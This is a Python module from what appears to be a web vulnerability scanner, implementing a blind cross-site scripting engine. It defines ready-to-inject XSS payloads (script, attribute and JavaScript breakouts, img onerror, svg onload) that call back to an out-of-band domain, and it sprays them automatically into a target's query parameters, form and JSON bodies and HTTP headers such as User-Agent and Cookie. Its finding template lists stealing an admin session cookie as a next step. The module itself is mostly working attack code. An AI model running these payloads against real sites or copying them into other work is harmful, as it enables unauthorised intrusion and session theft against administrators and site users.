"""
Blind XSS Engine
=================
Out-of-band (OOB) blind XSS delivery and callback monitoring.

Payloads fire asynchronously in victim browsers and beacon back via a
GoOOBListener-managed domain (or a fetch/img-based fallback domain).

Injection surfaces tested:
- GET/POST query parameters
- HTTP headers: User-Agent, Referer, X-Forwarded-For, X-Real-IP,
  Accept-Language, Cookie
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import uuid
from typing import Any, Dict, List, Optional

try:
    import httpx
    _HTTPX = True
except ImportError:
    _HTTPX = False

try:
    from .go_oob_listener import GoOOBListener
    _GOOB = True
except ImportError:
    _GOOB = False

try:
    from .oob_engine import OOBEngine
    _OOB = True
except ImportError:
    _OOB = False

log = logging.getLogger("oneinfinity.blind_xss_engine")

# ─────────────────────────────────────────────────────────────────────────────
# Payload factories
# ─────────────────────────────────────────────────────────────────────────────

_PAYLOAD_TEMPLATES: Dict[str, str] = {
    # Full-tag script-based beacon
    "html": "<script>fetch('https://{domain}/{cid}',{{method:'POST',mode:'no-cors'}})</script>",
    # Attribute-escape breaking beacon
    "attr": "\" onload=\"fetch('https://{domain}/{cid}',{{method:'POST',mode:'no-cors'}})",
    # JS context breakout beacon
    "js": "}};fetch('https://{domain}/{cid}',{{method:'POST',mode:'no-cors'}});//",
    # URL / href context
    "url": "javascript:fetch('https://{domain}/{cid}',{{method:'POST',mode:'no-cors'}})",
    # Fallback img beacon (no-CORS friendly, bypasses strict CSPs)
    "img": "<img src='x' onerror=\"new Image().src='https://{domain}/{cid}'\">",
    # SVG-based (works inside SVG context / XHTML)
    "svg": "<svg onload=\"fetch('https://{domain}/{cid}',{{method:'POST',mode:'no-cors'}})\">",
}

_FALLBACK_DOMAIN = "r.oast.me"


def _oob_domain_from_listener() -> tuple[Any, str]:
    """
    Attempt to acquire a domain from GoOOBListener (preferred) or OOBEngine.

    Returns
    -------
    (listener_or_engine, domain_str)
        listener_or_engine is None when no backend is available.
    """
    if _GOOB:
        try:
            listener = GoOOBListener()
            domain = listener.start()
            if domain:
                return listener, domain
        except Exception as exc:
            log.debug("[blind_xss] GoOOBListener start failed: %s", exc)

    if _OOB:
        try:
            engine = OOBEngine()
            domain = engine.start()
            if domain:
                return engine, domain
        except Exception as exc:
            log.debug("[blind_xss] OOBEngine start failed: %s", exc)

    return None, _FALLBACK_DOMAIN


# ─────────────────────────────────────────────────────────────────────────────
# Engine
# ─────────────────────────────────────────────────────────────────────────────

class BlindXSSEngine:
    """
    Blind XSS delivery engine with out-of-band callback monitoring.

    Parameters
    ----------
    oob_domain : str
        Override OOB domain.  When empty the engine negotiates a domain
        from GoOOBListener or OOBEngine at scan time.
    timeout : int
        HTTP request timeout in seconds.
    """

    def __init__(self, oob_domain: str = "", timeout: int = 10) -> None:
        self.oob_domain = oob_domain
        self.timeout = timeout
        self._client: Optional[Any] = None

    # ── HTTP client ───────────────────────────────────────────────────────────

    def _get_client(self) -> Any:
        if not _HTTPX:
            raise RuntimeError("httpx is required for BlindXSSEngine")
        if self._client is None:
            self._client = httpx.AsyncClient(
                timeout=self.timeout,
                verify=False,
                follow_redirects=True,
            )
        return self._client

    async def close(self) -> None:
        """Release the HTTP client."""
        if self._client is not None:
            await self._client.aclose()
            self._client = None

    # ── Payload generation ────────────────────────────────────────────────────

    def generate_payload(self, callback_id: str, context: str = "html") -> str:
        """
        Return a blind XSS payload that beacons to the OOB domain when
        rendered in a victim browser.

        Parameters
        ----------
        callback_id : str
            Unique identifier embedded in the beacon URL path so callbacks
            can be correlated to specific injection points.
        context : str
            Injection context — one of: html, attr, js, url, img, svg.
            Defaults to 'html'.

        Returns
        -------
        str
            Ready-to-inject payload string.
        """
        domain = self.oob_domain or _FALLBACK_DOMAIN
        template = _PAYLOAD_TEMPLATES.get(context, _PAYLOAD_TEMPLATES["html"])
        return template.format(domain=domain, cid=callback_id)

    # ── Helpers ───────────────────────────────────────────────────────────────

    @staticmethod
    def common_headers_to_test() -> List[str]:
        """HTTP request headers commonly reflected into admin interfaces."""
        return [
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Real-IP",
            "Accept-Language",
            "Cookie",
            "X-Forwarded-Host",
            "X-Original-URL",
        ]

    def _make_finding(
        self,
        url: str,
        injection_point: str,
        payload: str,
        callback_data: dict,
    ) -> dict:
        finding_id = hashlib.md5(
            f"bxss_{url}_{injection_point}_{payload}".encode()
        ).hexdigest()[:16]
        return {
            "finding_id": finding_id,
            "vuln_type": "blind_xss",
            "severity": "high",
            "url": url,
            "injection_point": injection_point,
            "payload": payload,
            "evidence": f"OOB callback received from injection via {injection_point}: {callback_data}",
            "tool": "blind_xss",
            "target": url,
            "callback_data": callback_data,
            "exploitation_steps": [
                f"1. Inject blind XSS payload into {injection_point}",
                "2. Payload stored/reflected and later rendered in admin/internal browser",
                f"3. Victim browser executes script and beacons to {self.oob_domain or _FALLBACK_DOMAIN}",
                "4. Steal admin session cookie or pivot to internal network",
            ],
        }

    # ── Core scanner ──────────────────────────────────────────────────────────

    async def inject_and_monitor(
        self,
        url: str,
        param: str,
        timeout: int = 30,
    ) -> List[dict]:
        """
        Inject blind XSS payloads into *param* (query + POST body) and
        common HTTP headers, then poll the OOB listener for callbacks.

        Parameters
        ----------
        url : str
            Target URL.
        param : str
            Query / form parameter to inject into.
        timeout : int
            Seconds to wait for OOB callbacks after all injections.

        Returns
        -------
        list[dict]
            Findings with vuln_type='blind_xss', severity='high'.
        """
        findings: List[dict] = []

        # Negotiate OOB domain
        listener, domain = _oob_domain_from_listener()
        if self.oob_domain:
            domain = self.oob_domain
        else:
            self.oob_domain = domain

        log.info("[blind_xss] OOB domain=%s url=%s param=%s", domain, url, param)

        client = self._get_client()
        contexts = ["html", "attr", "js", "url", "img", "svg"]
        injection_log: List[tuple] = []  # (injection_point, payload, callback_id)

        # ── 1. GET / POST parameter injection ─────────────────────────────────
        for ctx in contexts:
            cid = uuid.uuid4().hex[:12]
            payload = self.generate_payload(cid, ctx)
            try:
                # GET
                test_url = f"{url}?{param}={payload}"
                await client.get(test_url)
                injection_log.append((f"GET:{param}:{ctx}", payload, cid))
                # POST form-body
                post_resp = await client.post(
                    url,
                    data={param: payload},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                injection_log.append((f"POST:{param}:{ctx}", payload, cid))
                # POST JSON body
                await client.post(
                    url,
                    json={param: payload},
                    headers={"Content-Type": "application/json"},
                )
                injection_log.append((f"POST_JSON:{param}:{ctx}", payload, cid))
            except Exception as exc:
                log.debug("[blind_xss] param inject failed ctx=%s: %s", ctx, exc)

        # ── 2. Header injection ───────────────────────────────────────────────
        for header in self.common_headers_to_test():
            cid = uuid.uuid4().hex[:12]
            payload = self.generate_payload(cid, "html")
            try:
                await client.get(url, headers={header: payload})
                injection_log.append((f"HEADER:{header}", payload, cid))
            except Exception as exc:
                log.debug("[blind_xss] header inject failed %s: %s", header, exc)

        # ── 3. Poll for OOB callbacks ─────────────────────────────────────────
        callbacks: List[dict] = []
        if listener is not None:
            try:
                if isinstance(listener, GoOOBListener) if _GOOB else False:
                    callbacks = listener.read_callbacks(timeout=timeout)
                else:
                    # OOBEngine uses poll_interactions
                    callbacks = listener.poll_interactions(timeout_s=timeout)
            except Exception as exc:
                log.debug("[blind_xss] OOB poll error: %s", exc)

        # ── 4. Correlate callbacks to injection points ────────────────────────
        callback_ids_seen = {
            cb.get("payload", "") or cb.get("path", "") or str(cb)
            for cb in callbacks
        }

        for injection_point, payload, cid in injection_log:
            # Match if the callback URL/payload contains this callback_id
            hit = any(cid in str(cb) for cb in callbacks)
            if hit:
                cb_data = next(
                    (cb for cb in callbacks if cid in str(cb)), {}
                )
                findings.append(
                    self._make_finding(url, injection_point, payload, cb_data)
                )

        # If we got callbacks but cannot correlate (no cid in body), report generic
        if callbacks and not findings:
            for cb in callbacks:
                findings.append(
                    self._make_finding(
                        url, "unknown_injection_point",
                        f"<beacon domain={domain}>", cb
                    )
                )

        log.info(
            "[blind_xss] injections=%d callbacks=%d findings=%d",
            len(injection_log), len(callbacks), len(findings),
        )
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# Convenience
# ─────────────────────────────────────────────────────────────────────────────

async def scan_blind_xss(url: str, param: str = "q", oob_domain: str = "") -> List[dict]:
    """Async convenience wrapper for BlindXSSEngine."""
    engine = BlindXSSEngine(oob_domain=oob_domain)
    try:
        return await engine.inject_and_monitor(url, param)
    finally:
        await engine.close()
